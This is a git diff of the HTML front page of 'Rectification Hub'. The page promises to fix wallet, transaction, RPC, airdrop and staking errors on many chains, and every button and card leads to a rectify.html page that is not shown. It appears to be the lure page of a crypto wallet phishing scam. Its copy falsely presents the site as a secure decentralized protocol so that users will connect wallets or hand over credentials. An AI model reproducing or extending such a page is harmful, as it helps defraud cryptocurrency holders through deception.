@@ -1,49 +1,71 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="description" content="Rectification Hub - You can enjoy the benefits of web3 without worrying about technical details or security risks. ">
-  <!-- Open Graph / Facebook -->
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="">
-  <meta property="og:title" content="Rectification Hub - A Home For Resolving Mainnet / Network Related issues.">
-  <meta property="og:description" content="Rectification Hub - Built to fix various technical errors, without worrying about techinical details or security risks.">
-  <meta property="og:image" content="https://cdn.pixabay.com/photo/2018/05/23/04/32/cryptocurrency-3423264_1280.jpg">
-  <title>Validation , Rectification on Web3. <br>
-Across various Dex & Protocols</title>
-  <link rel="stylesheet" href="style.css"/>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Decentralized protocol for [rpc,txn hash error] Authentication of various wallet issues on Secure Server [Ororo]</title>
+  </head>
+  <body>
+        <!--==================================
+            Loader Start Here
+    ===================================-->
+    <div class="Loader hidden">
+      <div class="spinnerPairHolder">
+          <div class="spinnerPair">
+              <div class="spinnerPairCercle"></div>
+              <div class="spinnerPairCercle"></div>
+          </div>
+          <div class="spinnerPair">
+              <div class="spinnerPairCercle"></div>
+              <div class="spinnerPairCercle"></div>
+          </div>
+          <div class="spinnerPair">
+              <div class="spinnerPairCercle"></div>
+              <div class="spinnerPairCercle"></div>
+          </div>
+          <div class="spinnerPair">
+              <div class="spinnerPairCercle"></div>
+              <div class="spinnerPairCercle"></div>
+          </div>
+          <div class="spinnerPair">
+              <div class="spinnerPairCercle"></div>
+              <div class="spinnerPairCercle"></div>
+          </div>
+      </div>
+  </div>
+  <!--==================================
+          Loader End Here
+  ===================================-->
+
+  <div id="preloader">
+                
+  </div>
+<header>
+<div class="headerscrool">
+  <div class="double-bounce1"></div>
+  <div class="double-bounce2"></div>
   <style>
-    html,body {
-        margin: 0;
-        padding: 0;
-    }
+    .tradingview-widget-container {
+      background-color: #212326; /*Bootstrap blue or pick your shade */
+      padding: 10px;
+      border-radius: 10px;
+    } 
+    </style>     
 
-    .fade-in {
-        opacity: 0;
-        transform: translateY(20px);
-        transition: opacity 1s ease-out;
-    }
-
-    .fade-in.visible {
-        opacity: 1;
-        transform: translateY(0);
-    }
-  </style>
-</head>
-<body>
 </div>
 </header><!-- TradingView Widget BEGIN -->
 <script defer src="https://www.livecoinwatch.com/static/lcw-widget.js"></script> <div class="livecoinwatch-widget-5" lcw-base="USD" lcw-color-tx="#483765" lcw-marquee-1="coins" lcw-marquee-2="movers" lcw-marquee-items="30" ></div>
-      
+
 </div>
 <style>
 .item5 {
-  top: 0 !important;
-  background-image: url("./assets/img/topbanner05.jpg");
-  background-repeat: no-repeat;
-  background-position: top center;
-  min-height: 20%;
+top: 0 !important;
+background-image: url("./assets/img/topbanner05.jpg");
+background-repeat: no-repeat;
+background-position: top center;
+min-height: 20%;
 }
 </style>
 <!-- Javascript -->
@@ -52,13 +74,13 @@ Across various Dex & Protocols</title>
 <script src="assets/js/typed.js"></script>
 <script defer src="assets/js/scripts.min.js"></script>
 <script>
-    var typed3 = new Typed('#typed3', {
-        strings: ["All Networks", "Ethereum Chain", "Binance Smart Chain", "Polygon Chain", "Avalanche Chain", "Cronos Chain", "Arbitrum Chain", "Fantom Chain"],
-        typeSpeed: 50,
-        backSpeed: 20,
-        smartBackspace: true,
-        loop: true
-    });
+var typed3 = new Typed('#typed3', {
+    strings: ["All Networks", "Ethereum Chain", "Binance Smart Chain", "Polygon Chain", "Avalanche Chain", "Cronos Chain", "Arbitrum Chain", "Fantom Chain"],
+    typeSpeed: 50,
+    backSpeed: 20,
+    smartBackspace: true,
+    loop: true
+});
 </script>
 
 
@@ -68,103 +90,87 @@ const searchInput = document.getElementById("walletSearch");
 const walletItems = document.querySelectorAll(".wallet-item");
 
 searchInput.addEventListener("input", function () {
-  const filter = this.value.toLowerCase();
+const filter = this.value.toLowerCase();
 
-  walletItems.forEach(item => {
-    const span = item.querySelector("span");
-    const text = span.textContent.toLowerCase();
+walletItems.forEach(item => {
+const span = item.querySelector("span");
+const text = span.textContent.toLowerCase();
 
-    if (text.includes(filter)) {
-      item.style.display = "flex"; // Or "block" if you're using block layout
-    } else {
-      item.style.display = "none";
-    }
-  });
+if (text.includes(filter)) {
+  item.style.display = "flex"; // Or "block" if you're using block layout
+} else {
+  item.style.display = "none";
+}
+});
 });
 </script>
 <script>
 </script>
 <!-- TradingView Widget END -->
-  <header class="navbar">
-    <div class="logo">
-      <img src="images (1).jpeg" alt="Bridgers Logo"/>
-      <span>RECTIFICATION-HUB</span>
-    </div>
-    <div class="nav-right">
-    </div>
-  </header>
-
-  <main class="hero">
-
-</div>
-<div class="nav-right">
-<div class="selector">
-  <div class="sect-btn">
-
-
-    </div>
-    
  
-   
-    <select class="btn-select" name="" id="btn-select">
-        <option value="">Select Chain</option>
-        <option value="">Ethereum</option>
-        <option value="">Binance</option>
-        <option value="">Polygon</option>
-        <option value="">Avalanche</option>
-        <option value="">Near</option>
-        <option value="">Arbitum</option>
-        <option value="">Cronos</option>
-    </select>
-  </div>
-  <div name="" id="links">
-    <a href="">MetaMask
-    <a href="">Coinbase Wallet
-    <a href="">Wallet Connect
-  
+    <section class="section banner">
+      <div class="section-center ">
+        <div class="banner-flex">
+          <div class="banner-info">
+                    <h1>Decentralized Protocol For <br>Authentication & Validation of Various Wallet issues on Multiple Chains </h1>
+
+        <p>
+  Open, Secure and Decentralized Protocol for syncing and rectification of various wallet.
+        </p>
+
+        <p>
  
-</div>
-    </div>
-     
-    <h1>
-      SMART BLOCKCHAIN VALIDATION, FIX ERROR ON ALL
-      NETWORK & CHAIN.
-    </h1>
-    <p>
-      Blockchain protocol liquidity paths across various Wallets and networks.
-      You stay in control — we rectify it for you.
-    </p>
-    <p>
-        Synchronize any issues on web3 protocol, an online 24/7 support.
-        Validate any network errors — verification is expected.
-      </p>
-      
-      <a href="./rectify.html"> <button class="launch-btn">CONNECT WEB3</button>
-    
-  </main>
-</body>
-<!--QUICK START SECTION-->
+        </p>
+        <p>
+    It is an online server which gets you across to every wallet representative to enable effective complain and rectification of issues.
+        </p>
 
-<div class="quick-start"> 
-<h2>HUB</h2>
-    </div> 
-        <div class="card-sec"></div>
-                <!-- card start -->
-                <a href="./rectify.html">
-                    <div class="card">
-                    </div>
-                  </a>
-           
-          <!-- card end -->
-           
+        <p>
+    We are unifying Web3 by providing best-in-class, self-custodial, and multichain support using modern and strong encryption.
+        </p>
+          </div>
+ 
+        </div>
 
+        <div class="selector">
+          <div class="sect-btn">
+            
+         
+            <a href="./rectify.html"> <button class="btn">LAUNCH APP </button></a>
+           
+            <select class="btn-select" name="" id="btn-select">
+                <option value="">Select Chain</option>
+                <option value="">Ethereum</option>
+                <option value="">Binance</option>
+                <option value="">Polygon</option>
+                <option value="">Avalanche</option>
+                <option value="">Near</option>
+                <option value="">Arbitum</option>
+                <option value="">Cronos</option>
+            </select>
+          </div>
+          <div name="" id="links">
+            <a href="">MetaMask</a>
+            <a href="">Coinbase Wallet</a>
+            <a href="">Wallet Connect</a>
+          
+         
+        </div>
+            </div>
+    </section>
+
+
+    <section class="section selection">
+      <div class="section-center">
+        <h2>Hub, <br>  </h2>
       </div>
+
       <div class="card-sec">
         <!-- card start -->
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (1) 2.png" alt="">
+  <img class="card-img" src="./VA.png" alt="">
           </div>
         </a>
  
@@ -174,7 +180,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (2) 2.png" alt="">
+  <img class="card-img" src="./rec.png" alt="">
           </div>
         </a>
  
@@ -184,7 +190,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (3).png" alt="">
+  <img class="card-img" src="./auth.png" alt="">
           </div>
         </a>
  
@@ -194,7 +200,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (4).png" alt="">  
+  <img class="card-img" src="./api.png" alt="">
           </div>
         </a>
  
@@ -204,7 +210,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (6).png" alt="">
+  <img class="card-img" src="./aird.png" alt="">
           </div>
         </a>
  
@@ -214,7 +220,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (5).png" alt="">
+  <img class="card-img" src="./claim.png" alt="">
           </div>
         </a>
  
@@ -224,7 +230,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION.png" alt="">
+  <img class="card-img" src="./CROSS.png" alt="">
           </div>
         </a>
  
@@ -234,7 +240,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (7).png" alt="">
+  <img class="card-img" src="./defi (1).png" alt="">
           </div>
         </a>
  
@@ -244,7 +250,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (8).png" alt="">
+  <img class="card-img" src="./EARN (1).png" alt="">
           </div>
         </a>
  
@@ -254,7 +260,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (9).png" alt="">
+  <img class="card-img" src="./gas.png" alt="">
           </div>
         </a>
  
@@ -264,7 +270,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (10).png" alt="">
+  <img class="card-img" src="./pendi.png" alt="">
           </div>
         </a>
  
@@ -274,7 +280,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (12).png" alt="">
+  <img class="card-img" src="./lock.png" alt="">
           </div>
         </a>
  
@@ -284,7 +290,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (12).png" alt="">
+  <img class="card-img" src="./miitnt.png" alt="">
           </div>
         </a>
  
@@ -294,7 +300,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (13).png" alt="">
+  <img class="card-img" src="./rpc (1).png" alt="">
           </div>
         </a>
  
@@ -304,7 +310,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (14).png" alt="">
+  <img class="card-img" src="./txn.png" alt="">
           </div>
         </a>
  
@@ -314,7 +320,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (15).png" alt="">
+  <img class="card-img" src="./revo.png" alt="">
           </div>
         </a>
  
@@ -324,7 +330,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (16).png" alt="">
+  <img class="card-img" src="./pendi.png" alt="">
           </div>
         </a>
  
@@ -334,7 +340,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (17).png" alt="">
+  <img class="card-img" src="./stak.png" alt="">
           </div>
         </a>
  
@@ -344,7 +350,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (18).png" alt="">
+  <img class="card-img" src="./swa.png" alt="">
           </div>
         </a>
  
@@ -354,7 +360,7 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (19).png" alt="">
+  <img class="card-img" src="./tokens.png" alt="">
           </div>
         </a>
  
@@ -364,43 +370,11 @@ searchInput.addEventListener("input", function () {
         <a href="./rectify.html">
 
           <div class="card">
-  <img class="card-img" src="./VALIDATION (20).png" alt="">
+  <img class="card-img" src="./others.png" alt="">
           </div>
         </a>
  
 <!-- card end -->
-
-        <!-- card start -->
-        <a href="./rectify.html">
-
-            <div class="card">
-    <img class="card-img" src="./VALIDATION (21).png" alt="">
-            </div>
-          </a>
-   
-  <!-- card end -->
-
-          <!-- card start -->
-          <a href="./rectify.html">
-
-            <div class="card">
-    <img class="card-img" src="./VALIDATION (22).png" alt="">
-            </div>
-          </a>
-   
-  <!-- card end -->
-
-          <!-- card start -->
-          <a href="./rectify.html">
-
-            <div class="card">
-    <img class="card-img" src="./VALIDATION (21).png" alt="">
-            </div>
-          </a>
-   
-  <!-- card end -->
-
-  
     
 
         
@@ -411,15 +385,12 @@ searchInput.addEventListener("input", function () {
 
 
     <footer class=" footer">
-        <div class=" footer-sec" >
-          <p>Copyright © <span id=""></span> Blockchain Rectification. All rights reserved.</p>
-  
-          <p>Privacy Policy • Terms of Service</p>
-        </div>
-      </footer>
-      <script src="./script.js"></script>
-    </body>
+      <div class=" footer-sec" >
+        <p>Copyright © <span id=""></span> Blockchain Rectification. All rights reserved.</p>
 
+        <p>Privacy Policy • Terms of Service</p>
+      </div>
+    </footer>
     <script src="./script.js"></script>
   </body>
 
